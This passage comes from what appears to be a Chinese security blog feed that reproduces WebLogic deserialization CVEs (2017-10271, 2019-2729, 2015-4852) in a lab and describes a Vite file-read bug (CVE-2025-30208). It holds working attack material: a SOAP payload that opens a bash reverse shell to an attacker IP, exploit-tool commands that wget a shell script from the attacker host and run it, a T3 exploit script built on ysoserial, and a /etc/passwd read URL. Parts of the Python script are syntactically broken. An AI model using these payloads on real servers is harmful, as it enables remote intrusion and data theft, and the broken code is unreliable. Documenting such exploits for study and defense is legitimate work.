漏洞复现"></a>4.3 漏洞复现</h4><p>​CVE-2017-10271与前面的两个漏洞复现过程相似,利用点在bea_wIs9_async_response包中的uri。访问<a href="http://192.168.219.185:7001/async/AsyncResponseService%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%BAPOST,%E8%80%8C%E5%90%8E%E4%BF%AE%E6%94%B9Content-Type%E4%B8%BAtext/xml%E3%80%82">http://192.168.219.185:7001/async/AsyncResponseService，而后使用brup拦截该请求，修改请求方法为POST,而后修改Content-Type为text/xml。</a><br>​在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span><span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.116.63/4444 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>此处还是用void标签替代了object标签</strong></p><p>页面响应202</p><p><img src="https://pic1.imgdb.cn/item/6809151358cb8da5c8c6be8c.png"></p><p>反弹shell成功</p><h3 id="5-CVE-2019-2729"><a href="#5-CVE-2019-2729" class="headerlink" title="5. CVE-2019-2729"></a>5. CVE-2019-2729</h3><h4 id="5-1-漏洞介绍"><a href="#5-1-漏洞介绍" class="headerlink" title="5.1 漏洞介绍"></a>5.1 漏洞介绍</h4><p>​CVE-2019-2729漏洞是对CVE-2019-2725漏洞补丁进行绕过，形成新的漏洞利用方式，属于CVE-2019-2725漏洞的变形绕过。与CVE-2019-2725漏洞相似，CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意HTTP请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。</p><p>影响版本:10.3.6.0，12.1.3.0，12.2.1.3</p><h4 id="5-2-漏洞复现"><a href="#5-2-漏洞复现" class="headerlink" title="5.2 漏洞复现"></a>5.2 漏洞复现</h4><p>漏洞利用工具：<a href="https://github.com/ruthlezs/CvE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py">https://github.com/ruthlezs/CvE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py</a></p><p>​前面CVE-2017-3506的补丁是过滤了object，CVE-2017-10271的补丁是过滤了new，method标签，且void后面只能跟index，array后面可以跟class，但是必须要是byte类型的。<br>​而CVE-2019-2725的补丁也是使用黑名单禁用了class标签，但是我们可以使用<array method="forName">代替class标签即可。</array></p><p>方法一：</p><p>​访问<a href="http://192.168.219.185:7001/wls-wsat/CoordinatorPortType,%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%E3%80%82">http://192.168.219.185:7001/wls-wsat/CoordinatorPortType,而后使用brup拦截该请求。</a></p><p>​将利用工具中的req.txt提取出来，放于请求中，请求头部添加lfcmd字段，填写whoami命令，用于验证。发送后查看到命令回显。</p><p><img src="https://pic1.imgdb.cn/item/68091a6458cb8da5c8c6bffd.png"></p><p>方法二：</p><p>​直接使用工具</p><p><img src="https://pic1.imgdb.cn/item/68091b8858cb8da5c8c6c04e.png"></p><p><img src="https://pic1.imgdb.cn/item/68091bfe58cb8da5c8c6c061.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c id</span><br><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c "ls /"</span><br></pre></td></tr></tbody></table></figure><p>方法三：</p><p>在kali上的/tmp下编写一个shell脚本(shell.sh)，用bash进行反弹shell，内容如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.116.63/4444 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure><p>而后在kali的/tmp下，使用”python -m SimpleHTTPServer”，开启一个HTTP服务，后续让Weblogic服务器获取shell.sh。<br>在kali上使用漏洞利用工具，执行wget命令让Weblogic服务器下载kali中tmp目录下的shell.sh。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c "wget http://192.168.116.63:8000/shell.sh -P /tmp"</span><br></pre></td></tr></tbody></table></figure><p>使用”nc -lvp 4444”，监听4444端口。<br>在kali上使用漏洞利用工具，让服务器执行shell.sh，获取反弹shell。若无法获取shell，可以使用“bash shell.sh”。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c "sh shell.sh"</span><br></pre></td></tr></tbody></table></figure><p>查看nc，发现shell连接成功。</p><h2 id="Weblogic-T3反序列化"><a href="#Weblogic-T3反序列化" class="headerlink" title="Weblogic_T3反序列化"></a>Weblogic_T3反序列化</h2><h3 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1 前置知识"></a>1 前置知识</h3><p>​WebLogic的T3协议是WebLogic Server使用的一种专有通信协议，主要用于服务器之间的远程调用和客户端</p><p>与服务器之间的通信。</p><h4 id="1-1-RMI协议"><a href="#1-1-RMI协议" class="headerlink" title="1.1 RMI协议"></a>1.1 RMI协议</h4><p>​RMI（RemoteMethod Invocation）即远程方法调用。它能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输</p><p>​JavaRMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非VM，如WebLogic的T3和兼容CORBA的IIOP。</p><p>RMI远程方法调用的过程一般有以下几个部分参与：</p><ol><li>客户端对象(RMI Client)</li><li>服务端对象(RMI Server)</li><li>客户端代理对象(stub）：远程对象在客户端上的代理。</li><li>服务端代理对象(skeleton)：读取客户端传递的方法参数，调用服务器方的实际对象方法，并接收方法执行后的返回值。</li><li>RMI注册表(RMIregister)：其中注册了远程对象，并由RMI客户端查找已注册的远程对象。其以URL形式注册远程对象，并向客户端回复对远程对象的引用。</li></ol><p>RMI调用流程如图：</p><p><img src="https://pic1.imgdb.cn/item/681992cc58cb8da5c8deea43.png"></p><ol><li>服务端创建并注册远程对象，用于客户端访问。</li><li>客户端使用JNDI lookup去查找远程服务器上的RMI服务上的远程对象。</li><li>RMI register返回给客户端远程对象的Stub。</li><li>客户端通过Stub对象调用远程主机对象上的方法。</li><li>Stub代理客户端处理远程对象调用请求，并且序列化调用请求后通过IRMP协议传输，发送给服务端。</li><li>服务端接收到请求后，Skeleton调用方法。</li><li>服务端进行执行然后将返回的结果对象传给Skeleton对象。</li><li>Skeleton接收到结果对象，代理服务端将结果进行序列化，而后发送给客户端</li><li>客户端Stub对象接收到序列化的结果对象，并交由客户端反序列化结果对象</li></ol><h4 id="1-2-Weblogic-RMI"><a href="#1-2-Weblogic-RMI" class="headerlink" title="1.2 Weblogic RMI"></a>1.2 Weblogic RMI</h4><p>​WebLogic RMI 可以说是WebLogic对 Java RMI 的实现，与上述的Java RM调用过程基本一样，在功能和实现方法上有些差异，两者差异如下：</p><ul><li>WebLogic RMI支持集群部署和负载均衡。</li><li>webLogic支持stub和skeleton动态生成，将对象部署到RMI注册中心或JNDI时，webLogic将自动生成必要的代理。</li><li>WebLogicRMI在进行数据传输时，主要使用自己私有的T3协议进行通信（还有基于CORBA的IIOP协议)。</li></ul><h4 id="1-3-T3协议"><a href="#1-3-T3协议" class="headerlink" title="1.3 T3协议"></a>1.3 T3协议</h4><p>​T3协议是WebLogic私有的协议，相比于JRMP协议多了如下的一些特性:</p><ol><li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li><li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li></ol><h4 id="1-4-JNDI"><a href="#1-4-JNDI" class="headerlink" title="1.4 JNDI"></a>1.4 JNDI</h4><p>​JNDI（JavaNaming and Directory Interface）是SUN公司提供的一种标准的]ava命名系统接口，JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI可以兼容和访问现有目录服务如：DNS、XNam、LDAP、CORBA对象服务、文件系统、RMI、DSMLv1&amp;v2、NIS等。<br>如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">rmi://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">1dap://&lt;domain&gt;:&lt;port&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="1-5-WebLogicT3反序列化漏洞简介"><a href="#1-5-WebLogicT3反序列化漏洞简介" class="headerlink" title="1.5 WebLogicT3反序列化漏洞简介"></a>1.5 WebLogicT3反序列化漏洞简介</h4><p>​WebLogic T3 反序列化漏洞从利用方式来划分可以分为前后期，前期直接通过T3协议发送恶意反序列化对象，后期为利用T3协议配合JRMP或INDI接口反向发送反序列化数据。</p><p>WebLogicT3反序列化历史漏洞：</p><table><thead><tr><th align="center">CVE号</th><th align="center">受影响的组件</th><th align="center">受影响版本</th></tr></thead><tbody><tr><td align="center">CVE-2018-3252</td><td align="center">WLS Core Components</td><td align="center">10.3.6.0, 12.1.3.0, 12.2.1.3</td></tr><tr><td align="center">CVE-2018-3245</td><td align="center">WLS Core Components</td><td align="center">10.3.6.0, 12.1.3.0, 12.2.1.3</td></tr><tr><td align="center">CVE-2018-3191</td><td align="center">WLS Core Components</td><td align="center">10.3.6.0, 12.1.3.0, 12.2.1.3</td></tr><tr><td align="center">CVE-2018-2893</td><td align="center">WLS Core Components</td><td align="center">10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</td></tr><tr><td align="center">CVE-2018-2628</td><td align="center">WLS Core Components</td><td align="center">10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</td></tr><tr><td align="center">CVE-2017-3248</td><td align="center">Core Components</td><td align="center">10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1</td></tr><tr><td align="center">CVE-2016-3510</td><td align="center">Oracle WebLogic Server</td><td align="center">10.3.6.0, 12.1.3.0, 12.2.1.0</td></tr><tr><td align="center">CVE-2016-0638</td><td align="center">Oracle WebLogic Server</td><td align="center">10.3.6, 12.1.2, 12.1.3, 12.2.1</td></tr><tr><td align="center">CVE-2015-4852</td><td align="center">Oracle WebLogic Server</td><td align="center">10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0</td></tr></tbody></table><p>其中前期利用方式有CVE-2015-4852、CVEs2016-0638、CVE-2016-3510等。<br>而后期利用方式有CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3191、CVE-2018-3245等。</p><h3 id="2-漏洞原理分析"><a href="#2-漏洞原理分析" class="headerlink" title="2 漏洞原理分析"></a>2 漏洞原理分析</h3><h4 id="2-1-T3协议流量分析"><a href="#2-1-T3协议流量分析" class="headerlink" title="2.1 T3协议流量分析"></a>2.1 T3协议流量分析</h4><p>​利用相关漏洞利用工具与weblogic进行T3协议的通信，并实现weblogic rmi的调用过程，并使用wireshark抓取通信流量。找到响应的tcp数据包，右键-&gt;追踪流-&gt;TCP流。</p><p><img src="https://pic1.imgdb.cn/item/68199bea58cb8da5c8deee1d.png"></p><p>通信过程的TCP流：</p><p><img src="https://pic1.imgdb.cn/item/68199c2358cb8da5c8deee2b.png"></p><p>然后查看客户端发送的序列化数据的对应包，如下图：</p><p><img src="https://pic1.imgdb.cn/item/68199c5a58cb8da5c8deee46.png"></p><p>这个数据包主要由四部分组成：</p><ol><li>数据包长度。</li><li>T3协议头。</li><li>反序列化标志：T3协议中每个反序列化数据包前面都带有 fe 01 00 00，而后再加上Java反序列化标志ac ed 00 05。</li><li>序列化数据。<br>  (注意：Java反序列化数据开头包含两字节的魔术数字，这两个字节始终为十六进制的<strong>0xac 0xed</strong>，接下来是两字节的版本号这里为<strong>0x00 0x05</strong>。在T3协议的数据包中，在这个四个字节前还有四个字节fe 01 00 00）</li></ol><p>​这里的数据包只是我们使用漏洞利用工具发送的，其中就只有一段序列化数据，有时候并不只发送一段序列化数据，它可能会发送多个序列化数据，彼此之间以反序列化标志隔开，如下图：</p><img src="https://pic1.imgdb.cn/item/68199efc58cb8da5c8deefe5.png" style="zoom: 67%;"><p>T3数据包主要内容如下：</p><p><img src="https://pic1.imgdb.cn/item/68199f6a58cb8da5c8def015.png"></p><p>​从上面我们可以知道第二到第七部分内容，开头都是aced0005，说明这些都是AVA序列化的数据。<u>只要把其中一部分替换成我们的序列化数据就可以了</u>，于是我们可以将第二至七部分的AVA序列化数据的任意一个替换为恶意的序列化数据，或者直接将第一部分与恶意的序列化数据进行拼接后发送给服务端即可。</p><h4 id="2-2-CVE-2015-4852漏洞分析"><a href="#2-2-CVE-2015-4852漏洞分析" class="headerlink" title="2.2 CVE-2015-4852漏洞分析"></a>2.2 CVE-2015-4852漏洞分析</h4><p>​CVE-2015-4852可以说是WebLogicT3反序列化漏洞的开端，接下来我们将从这个漏洞去了解WebLogicT3反序列化漏洞。<br>​网上有许多针对CVE-2015-4852的exp，在网上找到以下python脚本与ysoserial工具进行漏洞利用。脚本功能如下：</p><ol><li>使用ysoserial工具生成的一个payload，其利用链为CommonsCollections1，执行的命令为在被攻击服务器的tmp下创建一个名为test_t3.txt的文件。</li><li>将上述已生成的payload添加到T3协议的数据包中，即将T3协议数据包第一部分与恶意的序列化数据进行拼接后发送给服务端。</li></ol><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget,cmd</span>):</span><br><span class="line">YSO_PATH = <span class="string">"ysoserial-master.jar"</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>,YSO_PATH, gadget, cmd],stdout=subprocess.PIPE)</span><br><span class="line"><span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span><br><span class="line">    <span class="comment">#初始化socket，前者指定用于服务器与服务器之间的网络通信，后者指定基于TCP的流式socket通信</span></span><br><span class="line">sock=socket.socket(socket.AF_INET，socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))<span class="comment"># 建立socket连接</span></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span> <span class="comment"># socket握手消息</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data=sock.recv(<span class="number">1024</span>)<span class="comment">#接收第一个socket数据包，HELO</span></span><br><span class="line">    data1=sock.recv(<span class="number">1024</span>)<span class="comment">#接收第二个socket数据包，：10.3.6.0.false</span></span><br><span class="line">    isweblogic= re.<span class="built_in">compile</span>(<span class="string">"HELO"</span>).findall(data.decode()<span class="comment"># 匹配字段中有无HELo</span></span><br><span class="line">    version=re.<span class="built_in">compile</span>(<span class="string">":(.*).0.false"</span>).findall(datal.decode()<span class="comment">#使用正则匹配服务器握手消息中返回的weblogic版本号</span></span><br><span class="line">    <span class="keyword">if</span> isweblogic <span class="keyword">and</span> version:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">"webLogic:"</span>+<span class="string">""</span>.join(version))<span class="comment">#输出weblogic版本号</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"NotWebLogic"</span>)<span class="comment">#对端可能不是weblogic</span></span><br><span class="line">    header=binascii.a2b_hex(<span class="string">b"00000000"</span>)<span class="comment">#先占位4个字节，这四个字节表示数据包长度</span></span><br><span class="line">    <span class="comment"># 以下为t3协议头</span></span><br><span class="line">                                                t3header=binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>)</span><br><span class="line">    desflag=binascii.a2b_hex(<span class="string">b"fe010000"</span>)<span class="comment">#反序列化数据标志fe010000，</span></span><br><span class="line">    payload= header + t3header + desflag+ payload <span class="comment">#将各部分拼接，将ysoserial生成payload添加到后面</span></span><br><span class="line">    <span class="comment">#计算payload长度，并将长度字段放于前四个字节</span></span><br><span class="line">    payload = struct.pack(<span class="string">"&gt;I"</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main_"</span>:</span><br><span class="line">    ip = <span class="string">"192.168.219.206"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget=<span class="string">"CommonsCollections1"</span> <span class="comment">#指定使用commonscollectionsl反序列化利用链</span></span><br><span class="line">    cmd=<span class="string">"touch /tmp/test_t3.txt"</span><span class="comment">#让被攻击服务器执行的指定命令，创建一个文件</span></span><br><span class="line">    payload = generatePayload(gadget, cmd) <span class="comment"># 仲用ysoserial生成payload</span></span><br></pre></td></tr></tbody></table></figure><p>​漏洞的触发点在wIserver\server\lib\wIthint3client.jar\weblogic\rjvmNnboundMsgAbbrev.class中,其中的readObject()方法会处理使用T3协议传入的序列化数据。在readObject(方法中又去调用了InboundMsgAbbrev.ServerChannelInputStream的readObjec方法，这里的var1即是Java序列化数据。</p><p><img src="https://pic1.imgdb.cn/item/6819a90958cb8da5c8df65a6.png"></p><p>​查看ServerChannellnputStream这个类，发现其继承于ObjectinputStream，而且并没有重写readObject（）方法，可以说这里没有对传入的序列化数据做任何处理，直接传入ObjectInputStream的readObject（）方法中进行反序列化操作。</p><p><img src="https://pic1.imgdb.cn/item/6819aa2c58cb8da5c8df69b4.png"></p><p>​而weblogic这个版本自带Apache Commons Collections3.2.0,于是我们可以利用ysoserial生成CommonsCollections1的payload进行利用，于是我们将T3协议的序列化数据替换成这个生成的payload即可触发反序列化漏洞。</p><p><img src="https://pic1.imgdb.cn/item/6819a9fb58cb8da5c8df69a0.png"></p></object></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>webshell流量分析</title>
      <link href="/2025/04/16/webshell-liu-liang-fen-xi/"/>
      <url>/2025/04/16/webshell-liu-liang-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="webshell流量分析"><a href="#webshell流量分析" class="headerlink" title="webshell流量分析"></a>webshell流量分析</h1><h2 id="蚁剑流量分析"><a href="#蚁剑流量分析" class="headerlink" title="蚁剑流量分析"></a>蚁剑流量分析</h2><p>上传一个webshell，用wireshark抓包，过滤http.request.method==POST</p><p><img src="https://pic1.imgdb.cn/item/67ff82e588c538a9b5d3bd7a.png"></p><p>特征表现在有多个item，</p><p>蚁剑是一个小马拉大马的过程，小马就是一句话木马，大马就是蚁剑的核心代码，</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vite CVE-2025-30208</title>
      <link href="/2025/04/15/vite-cve-2025-30208/"/>
      <url>/2025/04/15/vite-cve-2025-30208/</url>
      
        <content type="html"><![CDATA[<h1 id="Vite-CVE-2025-30208"><a href="#Vite-CVE-2025-30208" class="headerlink" title="Vite CVE-2025-30208"></a>Vite CVE-2025-30208</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p><strong>CVE-2025-30208</strong> 是 Vite（一个前端开发工具提供商）在特定版本中存在的安全漏洞。此漏洞允许攻击者通过特殊的 URL 参数绕过对文件系统的访问限制，从而获取任意文件内容（包括非 Vite 服务目录范围外的文件）。</p><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a>1. 漏洞原理</h3><ul><li>Vite 在开发服务器模式下提供了 @fs 用于访问服务允许范围内的文件。</li><li>本应对超出范围的文件请求返回 403 Restricted；然而，在请求 URL 中添加 ?raw?? 或 ?import&amp;raw?? 时，可以绕过原有检查。</li><li>这是由于在多个处理环节中会移除类似 ? 的结尾分隔符，但并未在查询字符串的正则匹配中考虑这一点；攻击者可利用这一缺陷读取目标文件内容。</li></ul><h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2. 漏洞影响"></a>2. 漏洞影响</h3><ul><li>在特定配置下，攻击者能够访问服务器上任意位置的文件（如 /tmp/secret.txt），并将内容返回给浏览器。</li><li>仅在 <strong>显式暴露 Vite 开发服务器</strong>（如使用 –host 或在 server.host 中配置对外可访问）时，外部才可直接发起请求进行文件读取。</li><li>如果文件中包含敏感数据（如凭据、配置等），则可能造成信息泄露。</li></ul><h2 id="二、受影响范围"><a href="#二、受影响范围" class="headerlink" title="二、受影响范围"></a>二、受影响范围</h2><h3 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1. 影响版本"></a>1. 影响版本</h3><p>根据官方与社区信息，以下 Vite 版本均存在该漏洞：</p><ul><li><blockquote><p>= 6.2.0, &lt;= 6.2.2</p></blockquote></li><li><blockquote><p>= 6.1.0, &lt;= 6.1.1</p></blockquote></li><li><blockquote><p>= 6.0.0, &lt;= 6.0.11</p></blockquote></li><li><blockquote><p>= 5.0.0, &lt;= 5.4.14</p></blockquote></li><li><p>&lt;= 4.5.9</p></li></ul><p>更概括地说：6.2.3、6.1.2、6.0.12、5.4.15、4.5.10 之前的版本。</p><h3 id="2-修复版本"><a href="#2-修复版本" class="headerlink" title="2. 修复版本"></a>2. 修复版本</h3><ul><li><strong>6.2.3</strong> 及以上</li><li><strong>6.1.2</strong></li><li><strong>6.0.12</strong></li><li><strong>5.4.15</strong></li><li><strong>4.5.10</strong></li></ul><p>仅上述版本及更高版本中已修复此漏洞。</p><h3 id="3-受影响部署方式"><a href="#3-受影响部署方式" class="headerlink" title="3. 受影响部署方式"></a>3. 受影响部署方式</h3><ul><li><strong>在生产或外部环境</strong>运行 Vite Dev Server，并且使用 –host 或在 vite.config.js 中的 server.host 开启对外网可访问。</li></ul><h3 id="4-不受影响场景"><a href="#4-不受影响场景" class="headerlink" title="4. 不受影响场景"></a>4. 不受影响场景</h3><ul><li>在本地开发环境使用 Vite，不对外暴露端口；仅自己访问 localhost。</li><li>已经将代码打包后交由 Nginx/Tomcat/Egg 等服务器代理，生产环境<strong>并无</strong>开启 Vite Dev Server。</li><li>使用修复后的 Vite 版本。</li></ul><h2 id="三、漏洞成因"><a href="#三、漏洞成因" class="headerlink" title="三、漏洞成因"></a>三、漏洞成因</h2><ul><li><strong>核心问题</strong>：当请求 URL 带有 ?raw?? / ?import&amp;raw?? 等结尾分隔符时，Vite 中移除 ? 等尾部分隔符的逻辑与查询字符串正则不匹配的处理不一致，导致访问超出允许列表的文件时的“403”限制被绕过。</li></ul><h2 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h2><ol><li>访问 <a href="http://127.0.0.1:57103/@fs/etc/passwd">http://127.0.0.1:57103/@fs/etc/passwd</a> 会返回：</li></ol><p><img src="https://pic1.imgdb.cn/item/67fe10d988c538a9b5d18c6d.png"></p><ol start="2"><li>但在请求后面加上 ?import&amp;raw??</li></ol><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:57103/@fs/etc/passwd?raw??</span><br></pre></td></tr></tbody></table></figure><p>返回结果将是该文件的内容</p><p><img src="https://pic1.imgdb.cn/item/67fe119688c538a9b5d18eb0.png"></p><h2 id="五、修复与缓解"><a href="#五、修复与缓解" class="headerlink" title="五、修复与缓解"></a>五、修复与缓解</h2><h3 id="1-升级到安全版本"><a href="#1-升级到安全版本" class="headerlink" title="1. 升级到安全版本"></a>1. 升级到安全版本</h3><ul><li>立即升级到 Vite <strong>6.2.3</strong> / <strong>6.1.2</strong> / <strong>6.0.12</strong> / <strong>5.4.15</strong> / <strong>4.5.10</strong> 或更高版本，以获取官方修补。</li></ul><h3 id="2-临时措施"><a href="#2-临时措施" class="headerlink" title="2. 临时措施"></a>2. 临时措施</h3><p>若暂时无法升级，可采取以下措施：</p><ul><li><strong>不要在生产环境开放 Vite Dev Server</strong> 对外访问；仅在内网或本地使用。</li><li><strong>限制访问范围</strong>：在防火墙或 Nginx 层做 IP 限制，确保仅可信的 IP 